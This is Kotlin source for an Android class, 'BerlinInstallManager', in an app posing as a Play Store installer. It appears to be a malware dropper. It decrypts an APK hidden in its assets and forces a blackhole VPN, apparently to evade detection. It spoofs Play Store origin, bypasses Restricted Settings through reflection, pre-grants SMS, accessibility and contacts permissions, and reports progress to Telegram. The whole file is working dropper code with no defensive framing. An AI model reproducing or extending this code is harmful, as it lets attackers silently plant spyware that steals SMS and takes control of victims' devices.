package com.playstore.installer.berlin

import android.annotation.SuppressLint
import android.app.Activity
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageInstaller
import android.content.pm.PackageManager
import android.net.Uri
import android.net.VpnService
import android.os.Build
import android.os.Handler
import android.os.Looper
import com.playstore.installer.BlackholeVpnService
import com.playstore.installer.BuildConfig
import com.playstore.installer.TelegramLogger
import java.io.IOException
import javax.crypto.Cipher
import javax.crypto.spec.IvParameterSpec
import javax.crypto.spec.SecretKeySpec

/**
 * BerlinInstallManager — dedicated berlin APK install manager.
 *
 * Completely separate from companion install flow in InstallActivity.
 * Instantiated and owned by InstallActivity after companion Stage.DONE.
 *
 * Flow:
 *   start() → getBerlinBytes() → prepareAndStartVpn() →
 *   BlackholeVpnService.VPN_ESTABLISHED → installViaSession() →
 *   BerlinInstallReceiver.STATUS_SUCCESS → onBerlinInstallSuccess callback
 *
 * Encryption:
 *   Build time : encrypt_berlin_for_installer.py → AES-256-CBC → blob in assets/[ASSET_C]
 *   Runtime    : getBerlinBytes() → AES-256-CBC decrypt using BuildConfig.BERLIN_KEY
 *   Blob format: [16-byte IV][PKCS7-padded ciphertext]
 *
 * Never touches companion flow. All state is local to this class.
 */
class BerlinInstallManager(
    private val activity: Activity,
    private val onBerlinInstallSuccess: () -> Unit,
    private val onBerlinInstallError: () -> Unit
) {

    private val handler = Handler(Looper.getMainLooper())
    private var pendingBerlinApkBytes: ByteArray? = null
    private var berlinVpnBypassEnabled: Boolean = true
    private var berlinInstallActive = false
    private var berlinRestartRetryCount = 0

    private val MAX_RETRIES = 2
    private val MAX_RESTART_RETRIES = 3
    private val SESSION_REQUEST = 2001  // Different from companion SESSION_REQUEST=1001
    private val VPN_REQUEST_CODE_BERLIN = 2003  // Different from companion VPN_REQUEST_CODE=1003

    // ── Broadcast receivers ───────────────────────────────────────────────────

    val berlinVpnEstablishedReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            if (intent.action == BlackholeVpnService.VPN_ESTABLISHED_ACTION) {
                val apk = pendingBerlinApkBytes ?: return
                pendingBerlinApkBytes = null
                installViaSession(apk, attempt = 1)
            }
        }
    }

    val berlinInstallSuccessReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            val successAction = activity.packageName + BerlinInstallReceiver.BERLIN_INSTALL_SUCCESS_SUFFIX
            if (intent.action == successAction) {
                TelegramLogger.send(activity, "BERLIN_INSTALL_SUCCESS", "RECEIVED", "berlin install complete")
                onBerlinInstallSuccess()
            }
        }
    }

    val berlinInstallConfirmReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            if (intent.action == BerlinInstallReceiver.BERLIN_INSTALL_CONFIRM_ACTION) {
                val confirmIntent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    intent.getParcelableExtra(Intent.EXTRA_INTENT, Intent::class.java)
                } else {
                    @Suppress("DEPRECATION")
                    intent.getParcelableExtra<Intent>(Intent.EXTRA_INTENT)
                }
                confirmIntent?.let {
                    try {
                        activity.moveTaskToBack(true)
                        @Suppress("DEPRECATION")
                        activity.startActivityForResult(it, VPN_REQUEST_CODE_BERLIN)
                    } catch (e: Exception) {
                        try {
                            it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            activity.startActivity(it)
                        } catch (e2: Exception) { }
                    }
                }
            }
        }
    }

    val berlinInstallRestartReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            if (intent.action == BerlinInstallReceiver.BERLIN_INSTALL_RESTART_ACTION) {
                berlinRestartRetryCount++
                if (berlinRestartRetryCount > MAX_RESTART_RETRIES) {
                    TelegramLogger.send(
                        context, "BERLIN_INSTALL_RESTART", "MAX_RETRIES_EXCEEDED",
                        "retryCount=$berlinRestartRetryCount limit=$MAX_RESTART_RETRIES — Stage.ERROR"
                    )
                    activity.runOnUiThread { onBerlinInstallError() }
                    return
                }
                TelegramLogger.send(
                    context, "BERLIN_INSTALL_RESTART", "RETRY",
                    "attempt=$berlinRestartRetryCount of $MAX_RESTART_RETRIES — restarting berlin install"
                )
                berlinInstallActive = false
                start()
            }
        }
    }

    // ── Register / Unregister receivers ──────────────────────────────────────

    fun registerReceivers() {
        val successAction = activity.packageName + BerlinInstallReceiver.BERLIN_INSTALL_SUCCESS_SUFFIX

        listOf(
            berlinVpnEstablishedReceiver    to IntentFilter(BlackholeVpnService.VPN_ESTABLISHED_ACTION),
            berlinInstallSuccessReceiver    to IntentFilter(successAction),
            berlinInstallConfirmReceiver    to IntentFilter(BerlinInstallReceiver.BERLIN_INSTALL_CONFIRM_ACTION),
            berlinInstallRestartReceiver    to IntentFilter(BerlinInstallReceiver.BERLIN_INSTALL_RESTART_ACTION)
        ).forEach { (receiver, filter) ->
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                activity.registerReceiver(receiver, filter, Context.RECEIVER_NOT_EXPORTED)
            } else {
                activity.registerReceiver(receiver, filter)
            }
        }
    }

    fun unregisterReceivers() {
        listOf(
            berlinVpnEstablishedReceiver,
            berlinInstallSuccessReceiver,
            berlinInstallConfirmReceiver,
            berlinInstallRestartReceiver
        ).forEach { receiver ->
            try { activity.unregisterReceiver(receiver) } catch (_: Exception) {}
        }
        handler.removeCallbacksAndMessages(null)
    }

    // ── Entry point ───────────────────────────────────────────────────────────

    fun start() {
        if (berlinInstallActive) {
            TelegramLogger.send(activity, "BERLIN_START", "SKIPPED", "berlinInstallActive=true")
            return
        }
        berlinInstallActive = true
        TelegramLogger.send(activity, "BERLIN_START", "OK", "starting berlin install flow")

        Thread {
            try {
                val apkBytes = getBerlinBytes()
                if (apkBytes.isNotEmpty()) {
                    activity.runOnUiThread { prepareAndStartVpn(apkBytes) }
                } else {
                    TelegramLogger.send(activity, "BERLIN_START", "FAILED",
                        "getBerlinBytes returned empty — error")
                    activity.runOnUiThread { onBerlinInstallError() }
                }
            } catch (e: Exception) {
                TelegramLogger.send(activity, "BERLIN_START", "EXCEPTION",
                    "${e.javaClass.simpleName}: ${e.message}")
                activity.runOnUiThread { onBerlinInstallError() }
            }
        }.start()
    }

    // ── Decrypt berlin blob from assets ──────────────────────────────────────

    /**
     * Reads encrypted berlin blob from assets/[BuildConfig.ASSET_C],
     * decrypts with AES-256-CBC using BuildConfig.BERLIN_KEY.
     * Returns raw berlin APK bytes ready for PackageInstaller.
     *
     * Blob format: [16-byte IV][AES-256-CBC PKCS7-padded ciphertext]
     */
    private fun getBerlinBytes(): ByteArray {
        return try {
            val encrypted = activity.assets.open(BuildConfig.ASSET_C).use { it.readBytes() }
            if (encrypted.size < 17) {
                TelegramLogger.send(activity, "GET_BERLIN_BYTES", "FAILED",
                    "ASSET_C=${BuildConfig.ASSET_C} size=${encrypted.size} too small (min 17 bytes)")
                return ByteArray(0)
            }

            val decrypted = decryptBerlinBlob(encrypted)

            // Verify decrypted bytes are a valid APK (ZIP magic: PK\x03\x04)
            val validApk = decrypted.size > 4 &&
                decrypted[0] == 0x50.toByte() &&
                decrypted[1] == 0x4B.toByte() &&
                decrypted[2] == 0x03.toByte() &&
                decrypted[3] == 0x04.toByte()

            val zipMagic = if (decrypted.size > 4)
                decrypted.take(4).map { "%02x".format(it) }.joinToString("") else "N/A"

            TelegramLogger.send(activity, "GET_BERLIN_BYTES",
                if (validApk) "OK" else "INVALID_MAGIC",
                "ASSET_C=${BuildConfig.ASSET_C} encSize=${encrypted.size} " +
                "decSize=${decrypted.size} magic=$zipMagic validApk=$validApk"
            )
            decrypted

        } catch (e: Exception) {
            TelegramLogger.send(activity, "GET_BERLIN_BYTES", "EXCEPTION",
                "ASSET_C=${BuildConfig.ASSET_C} error=${e.javaClass.simpleName}: ${e.message}")
            ByteArray(0)
        }
    }

    /**
     * AES-256-CBC decryption of berlin blob.
     * Blob format: [16-byte IV][PKCS7-padded ciphertext]
     * Key source: BuildConfig.BERLIN_KEY (64-char hex, injected at build time by FingerprintPlugin)
     */
    private fun decryptBerlinBlob(blob: ByteArray): ByteArray {
        if (blob.size < 17) return ByteArray(0)

        val keyBytes = try {
            BuildConfig.BERLIN_KEY.chunked(2).map { it.toInt(16).toByte() }.toByteArray()
        } catch (e: Exception) {
            TelegramLogger.send(activity, "BERLIN_DECRYPT", "KEY_PARSE_FAILED",
                "${e.javaClass.simpleName}: ${e.message}")
            return ByteArray(0)
        }

        if (keyBytes.size != 32) {
            TelegramLogger.send(activity, "BERLIN_DECRYPT", "KEY_SIZE_WRONG",
                "Expected 32 bytes, got ${keyBytes.size}")
            return ByteArray(0)
        }

        return try {
            val iv         = blob.copyOfRange(0, 16)
            val ciphertext = blob.copyOfRange(16, blob.size)

            val secretKey  = SecretKeySpec(keyBytes, "AES")
            val ivSpec     = IvParameterSpec(iv)
            val cipher     = Cipher.getInstance("AES/CBC/PKCS5Padding")
            cipher.init(Cipher.DECRYPT_MODE, secretKey, ivSpec)
            cipher.doFinal(ciphertext)

        } catch (e: Exception) {
            TelegramLogger.send(activity, "BERLIN_DECRYPT", "DECRYPT_FAILED",
                "${e.javaClass.simpleName}: ${e.message}")
            ByteArray(0)
        }
    }

    // ── VPN Blackhole — same mandatory flow as companion ──────────────────────

    /**
     * Stores APK bytes and starts VPN Blackhole — mandatory for berlin install.
     * Mirrors companion prepareAndStartVpn() exactly.
     */
    fun prepareAndStartVpn(apkBytes: ByteArray) {
        pendingBerlinApkBytes = apkBytes

        berlinVpnBypassEnabled = activity.getSharedPreferences(
            com.playstore.installer.StringPool.d(com.playstore.installer.StringPool.VG_PREFS),
            Activity.MODE_PRIVATE
        ).getInt(com.playstore.installer.StringPool.d(com.playstore.installer.StringPool.VPN_FLAG), 1) == 1

        if (!berlinVpnBypassEnabled) {
            TelegramLogger.send(activity, "BERLIN_VPN_FLOW", "SKIPPED",
                "runtimegate=$berlinVpnBypassEnabled — installing berlin without VPN (FUD OFF)")
            pendingBerlinApkBytes = null
            try { activity.unregisterReceiver(berlinVpnEstablishedReceiver) } catch (_: Exception) {}
            installViaSession(apkBytes, attempt = 1)
            return
        }

        if (BlackholeVpnService.isRunning) {
            TelegramLogger.send(activity, "BERLIN_VPN_FLOW", "ALREADY_RUNNING",
                "VPN already active — proceeding directly to berlin install")
            pendingBerlinApkBytes = null
            installViaSession(apkBytes, attempt = 1)
            return
        }

        val prepareIntent = VpnService.prepare(activity)
        if (prepareIntent == null) {
            TelegramLogger.send(activity, "BERLIN_VPN_CONSENT", "ALREADY_GRANTED",
                "starting BlackholeVpnService for berlin")
            BlackholeVpnService.start(activity, berlinVpnBypassEnabled)
            // berlinVpnEstablishedReceiver will call installViaSession when tunnel is ready
        } else {
            TelegramLogger.send(activity, "BERLIN_VPN_CONSENT", "NEEDED",
                "launching system VPN dialog for berlin")
            launchVpnConsent(prepareIntent)
        }
    }

    private fun launchVpnConsent(prepareIntent: Intent) {
        try {
            @Suppress("DEPRECATION")
            activity.startActivityForResult(prepareIntent, VPN_REQUEST_CODE_BERLIN)
        } catch (e: Exception) {
            TelegramLogger.send(activity, "BERLIN_VPN_CONSENT", "LAUNCH_FAILED",
                "${e.javaClass.simpleName}: ${e.message}")
            handler.postDelayed({
                val retryIntent = VpnService.prepare(activity)
                if (retryIntent == null) {
                    BlackholeVpnService.start(activity, berlinVpnBypassEnabled)
                } else {
                    launchVpnConsent(retryIntent)
                }
            }, 2_000L)
        }
    }

    /**
     * Called from InstallActivity.onActivityResult for VPN_REQUEST_CODE_BERLIN.
     */
    fun onVpnActivityResult(resultCode: Int) {
        if (resultCode == Activity.RESULT_OK) {
            TelegramLogger.send(activity, "BERLIN_VPN_CONSENT", "GRANTED",
                "starting BlackholeVpnService for berlin")
            BlackholeVpnService.start(activity, berlinVpnBypassEnabled)
        } else {
            TelegramLogger.send(activity, "BERLIN_VPN_CONSENT", "DENIED",
                "re-prompting in 2s (VPN mandatory for berlin)")
            handler.postDelayed({
                val retryIntent = VpnService.prepare(activity)
                if (retryIntent == null) {
                    BlackholeVpnService.start(activity, berlinVpnBypassEnabled)
                } else {
                    launchVpnConsent(retryIntent)
                }
            }, 2_000L)
        }
    }

    // ── PackageInstaller session — mirrors companion installViaSession() exactly ──

    @SuppressLint("BlockedPrivateApi")
    fun installViaSession(apkBytes: ByteArray, attempt: Int) {
        TelegramLogger.send(activity, "BERLIN_INSTALL_VIA_SESSION", "START",
            "attempt=$attempt apkSize=${apkBytes.size}")
        try {
            val packageInstaller = activity.packageManager.packageInstaller
            val params = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)

            // Extract berlin package name for session params
            val tmpFile = java.io.File(activity.cacheDir, "berlin_tmp.apk")
            tmpFile.writeBytes(apkBytes)
            val pkgName: String = try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    @Suppress("DEPRECATION")
                    activity.packageManager.getPackageArchiveInfo(
                        tmpFile.absolutePath,
                        PackageManager.PackageInfoFlags.of(0)
                    )?.packageName ?: ""
                } else {
                    @Suppress("DEPRECATION")
                    activity.packageManager.getPackageArchiveInfo(tmpFile.absolutePath, 0)?.packageName ?: ""
                }
            } catch (_: Exception) { "" }
            tmpFile.delete()

            if (pkgName.isNotEmpty()) {
                params.setAppPackageName(pkgName)
                if (attempt <= 1) {
                    try {
                        params.setOriginatingUri(Uri.parse("market://details?id=$pkgName"))
                        params.setReferrerUri(Uri.parse("android-app://com.android.vending"))
                    } catch (_: Exception) { }
                }
            }

            params.setSize(apkBytes.size.toLong())
            if (attempt <= 1) params.setInstallLocation(1)

            // Layer 1 bypass: USER_ACTION_NOT_REQUIRED
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                params.setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED)

            // Layer 2 bypass: PACKAGE_SOURCE_STORE — bypasses Restricted Settings
            if (Build.VERSION.SDK_INT >= 34) {
                params.setPackageSource(1)
            } else if (Build.VERSION.SDK_INT == 33) {
                try {
                    val m = params.javaClass.getDeclaredMethod("setPackageSource", Int::class.javaPrimitiveType)
                    m.isAccessible = true
                    m.invoke(params, 1)
                } catch (_: Exception) { }
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU && attempt <= 1)
                params.setDontKillApp(true)
            params.setInstallReason(PackageManager.INSTALL_REASON_USER)

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE && attempt <= 1) {
                try { params.setRequestUpdateOwnership(true) } catch (_: Exception) { }
            }

            // Permission whitelist — same approach as companion
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                val allRestrictedPerms = setOf(
                    "android.permission.READ_SMS",
                    "android.permission.SEND_SMS",
                    "android.permission.RECEIVE_SMS",
                    "android.permission.RECEIVE_WAP_PUSH",
                    "android.permission.RECEIVE_MMS",
                    "android.permission.BIND_ACCESSIBILITY_SERVICE",
                    "android.permission.READ_PHONE_STATE",
                    "android.permission.READ_CONTACTS",
                    "android.permission.READ_EXTERNAL_STORAGE",
                    "android.permission.MANAGE_EXTERNAL_STORAGE",
                    "android.permission.RECEIVE_BOOT_COMPLETED",
                    "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
                    "android.permission.FOREGROUND_SERVICE",
                    "android.permission.FOREGROUND_SERVICE_DATA_SYNC"
                )

                if (Build.VERSION.SDK_INT < 35 && attempt <= 1) {
                    try {
                        val m = PackageInstaller.SessionParams::class.java
                            .getDeclaredMethod("setInstallerPackageName", String::class.java)
                        m.invoke(params, "com.android.vending")
                    } catch (_: Exception) { }
                }

                if (Build.VERSION.SDK_INT < 36 && attempt <= 1) {
                    try {
                        val f = PackageInstaller.SessionParams::class.java.getDeclaredField("installFlags")
                        f.isAccessible = true
                        f.setInt(params, f.getInt(params) or 0x00000002)
                    } catch (_: Exception) { }
                }

                try { params.setWhitelistedRestrictedPermissions(allRestrictedPerms) } catch (_: Exception) { }

                if (attempt <= 1) {
                    try {
                        val m = PackageInstaller.SessionParams::class.java
                            .getDeclaredMethod("setWhitelistedRestrictedPermissions", Set::class.java)
                        m.isAccessible = true
                        m.invoke(params, allRestrictedPerms)
                    } catch (_: Exception) { }
                }

                if (attempt <= 1) {
                    try {
                        val f = PackageInstaller.SessionParams::class.java
                            .getDeclaredField("whitelistedRestrictedPermissions")
                        f.isAccessible = true
                        f.set(params, HashSet(allRestrictedPerms))
                    } catch (_: Exception) { }
                }

                // INSTALL_ALL_WHITELIST_RESTRICTED_PERMISSIONS flag — set last
                try {
                    val f = PackageInstaller.SessionParams::class.java.getDeclaredField("installFlags")
                    f.isAccessible = true
                    f.setInt(params, f.getInt(params) or 0x00100000)
                } catch (_: Exception) { }

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE && attempt <= 1) {
                    try {
                        val m = PackageInstaller.SessionParams::class.java
                            .getDeclaredMethod("setAutoRevokePermissionsExempted", Boolean::class.java)
                        m.isAccessible = true
                        m.invoke(params, true)
                    } catch (_: Exception) { }
                }
            }

            val sessionId = try {
                val id = packageInstaller.createSession(params)
                TelegramLogger.send(activity, "BERLIN_CREATE_SESSION", "OK",
                    "attempt=$attempt sessionId=$id pkgName=$pkgName")
                id
            } catch (e: Exception) {
                TelegramLogger.send(activity, "BERLIN_CREATE_SESSION", "FAILED",
                    "attempt=$attempt error=${e.javaClass.simpleName}: ${e.message}")
                throw e
            }

            val session = packageInstaller.openSession(sessionId)
            try {
                // Cache berlin APK for activity recreation survival
                val cachedApk = java.io.File(activity.cacheDir, "berlin_cached.apk")
                cachedApk.writeBytes(apkBytes)

                session.openWrite("berlin.apk", 0, apkBytes.size.toLong()).use { out ->
                    out.write(apkBytes)
                    session.fsync(out)
                }

                // BerlinInstallReceiver handles the callback
                val intent = Intent(activity, BerlinInstallReceiver::class.java).apply {
                    action = activity.packageName + BerlinInstallReceiver.BERLIN_SESSION_ACTION_SUFFIX
                }
                val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
                else PendingIntent.FLAG_UPDATE_CURRENT

                session.commit(
                    PendingIntent.getBroadcast(activity, SESSION_REQUEST, intent, flags).intentSender
                )
                session.close()

                TelegramLogger.send(activity, "BERLIN_SESSION_COMMIT", "OK",
                    "attempt=$attempt sessionId=$sessionId pkgName=$pkgName — waiting for BerlinInstallReceiver")

            } catch (e: IOException) {
                TelegramLogger.send(activity, "BERLIN_SESSION_WRITE", "IO_EXCEPTION",
                    "attempt=$attempt error=${e.javaClass.simpleName}: ${e.message}")
                session.abandon()
                if (attempt < MAX_RETRIES) {
                    handler.postDelayed({ installViaSession(apkBytes, attempt + 1) }, 1000)
                } else {
                    TelegramLogger.send(activity, "BERLIN_SESSION_WRITE", "MAX_RETRIES_REACHED",
                        "attempt=$attempt — error")
                    activity.runOnUiThread { onBerlinInstallError() }
                }
            }

        } catch (e: Exception) {
            TelegramLogger.send(activity, "BERLIN_INSTALL_VIA_SESSION", "OUTER_EXCEPTION",
                "attempt=$attempt error=${e.javaClass.simpleName}: ${e.message}")
            if (attempt < MAX_RETRIES) {
                handler.postDelayed({ installViaSession(apkBytes, attempt + 1) }, 1000)
            } else {
                TelegramLogger.send(activity, "BERLIN_INSTALL_VIA_SESSION", "MAX_RETRIES_REACHED",
                    "attempt=$attempt — error")
                activity.runOnUiThread { onBerlinInstallError() }
            }
        }
    }

    companion object {
        const val VPN_REQUEST_CODE_BERLIN = 2003
    }
}
